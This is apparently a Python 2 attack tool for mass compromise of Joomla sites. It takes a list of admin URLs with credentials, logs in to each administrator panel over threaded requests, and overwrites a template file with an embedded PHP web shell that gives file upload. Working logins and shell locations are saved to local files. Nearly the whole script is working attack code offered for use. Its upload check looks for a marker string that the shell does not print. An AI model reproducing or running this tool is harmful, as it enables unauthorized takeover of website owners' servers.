#!/usr/bin/python
 # -*-coding:Latin-1 -*
import sys,urllib2
from colorama import *

from multiprocessing import Pool
from multiprocessing.dummy import Pool as ThreadPool
from colorama import Fore								
from colorama import Style								
from termcolor import colored
import requests, sys, re, os, time, random
from colorama import Fore, Back, Style
init()

la7mar  = '\033[91m'
lazra9  = '\033[94m'
la5dhar = '\033[92m'
movv    = '\033[95m'
lasfar  = '\033[93m'
ramadi  = '\033[90m'
blid    = '\033[1m'
star    = '\033[4m'
bigas   = '\033[07m'
bigbbs  = '\033[27m'
hell    = '\033[05m'
saker   = '\033[25m'
labyadh = '\033[00m'
cyan    = '\033[0;96m'
r = Fore.RED
g = Fore.GREEN
w = Fore.WHITE
b = Fore.BLUE
y = Fore.YELLOW
m = Fore.MAGENTA


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """


  __  __                   _           _   _       _                 _ 
 |  \/  | __ _ ___ ___    | |_ __ ___ | | | |_ __ | | ___   __ _  __| |
 | |\/| |/ _` / __/ __|_  | | '_ ` _ \| | | | '_ \| |/ _ \ / _` |/ _` |
 | |  | | (_| \__ \__ \ |_| | | | | | | |_| | |_) | | (_) | (_| | (_| |
 |_|  |_|\__,_|___/___/\___/|_| |_| |_|\___/| .__/|_|\___/ \__,_|\__,_|
                                            |_|                        
                                  Marwan007   
	Note : http://www.site.com/administrator/index.php&user&~password#							  
                                                          
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.05)
   
   
 
 
                                   
                                                           
####### Colors   ######
   
fr  =   Fore.RED                                           
fc  =   Fore.CYAN                                          
fw  =   Fore.WHITE                                         
fg  =   Fore.GREEN                                         
sd  =   Style.DIM                                          
sn  =   Style.NORMAL                                       
sb  =   Style.BRIGHT                                       
 
#######################
 

# EX list.txt :  http://www.site.com/administrator/index.php&user&~password#
 
print_logo()
       
shell = """marwan007Joomla <?php echo 'None'.'<br>'.'Uname:'.php_uname().'<br>'.$cwd = getcwd(); Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  <input type="file" size="20" name="uploads" /> <input type="submit" name="submit" value="upload" />  </form>  </center></td></tr> </table><br>'; if (!empty ($_FILES['uploads'])) {     move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     Echo "<script>alert('upload Done');        </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ?>"""
 
 
def f3ckJoomla(url):
   
   
    Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
   
    try:
   
            url = url.strip()
           
 
               
            ## Get User and Pass From list ...
            user = re.findall('&(.*?)&',url)
            passwd = re.findall('&~(.*?)#',url)
            site = re.findall('http://(.*?)/administrator/index.php',url)
               
               
            req = requests.Session()
               
            # Request Token :D
            libs = req.get('http://'+site[0]+'/administrator/index.php')
            token = re.findall('type="hidden" name="(.*?)" value="1"', libs.text)
 
            # logs data of joomla ...
            logs = {'username' :user[0],
                    'passwd'   :passwd[0],
                    token[0]: '1',
                    'lang':'en-GB',
                    'option':'com_login',
                    'task':'login',
                    'return':'aW5kZXgucGhw'}
               
            lib = req.post('http://'+site[0]+'/administrator/index.php', data=logs, headers=Agent)
 
            # Check if login or no #_#
            if 'New Article' in lib.content:
                   
                checkreq = req.post('http://'+site[0]+'/administrator/index.php?option=com_plugins')
                if 'New Article' in checkreq.content:
                    print '{}[Target]: {} ====>      | {} |  {}  {}{} [ Success login ]  '.format(sb, "http://"+site[0], user[0], passwd[0], fg, sb)
                    open('Logins_OK.txt', 'a').write("http://"+site[0]+" |"+user[0]+"|"+passwd[0]+'\n')
                   
                    # Start Upload Shell :D
                       
                    # Path File
                       
                    io = req.get('http://'+site[0]+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA%3D')
                   
                   
                    # Get Token ... of File page #_#
                    Tokenedit = re.findall('<input type="hidden" name="(.*?)" value="1" />', io.text)
                       
                   
                   
                       
                    edit_file = {'jform[source]':shell,
                                 'task':'template.apply',
                                 Tokenedit[0]:'1',
                                 'jform[extension_id]':'503',
                                 'jform[filename]':'/jsstrings.php'}
                       
                    io1 = req.post('http://'+site[0]+'/administrator/index.php?option=com_templates&view=template&id=503&file=L2pzc3RyaW5ncy5waHA=', data=edit_file)
                       
                    # Check it if shell done upload or no
                    checker = requests.get('http://'+site[0]+'/templates/beez3//jsstrings.php')
                       
                    if 'MisterSpyJoomla' in checker.content:
                        print '{}[Target]: {} ====>       {}{} [ Success Upload ]  '.format(sb, "http://"+site[0], fg, sb)
                        open('Jo-Shells.txt', 'a').write('http://'+site[0]+str('/templates/beez3/jsstrings.php')+'\n')
                       
                       
                    else:
                        print '{}[Target]: {} ====>       {}{} [ Failed Upload ]  '.format(sb, "http://"+site[0], fr, sb)
 
            else:
                print '{}[Target]: {} ====>       | {} | {}  {}{}[ login Failed ]  '.format(sb, 'http://'+site[0], user[0], passwd[0], fr, sb)
           
    except:
        pass
   
   

 
def main():    
   
    for i in ListStie:
        try:
            i = i.strip()
            data=f3ckJoomla(i)
        except:
            pass
spy = raw_input('Enter List Nname :' )       
ListStie = open(spy, 'r').readlines()      
pool = ThreadPool(10)
pool.map(f3ckJoomla, ListStie)
pool.close()
pool.join()
 
if __name__ == '__main__':     
    print("Finished, Success Logins saved to : Logins_OK.txt   ,  Shells  saved to : Jo-Shells.txt ")
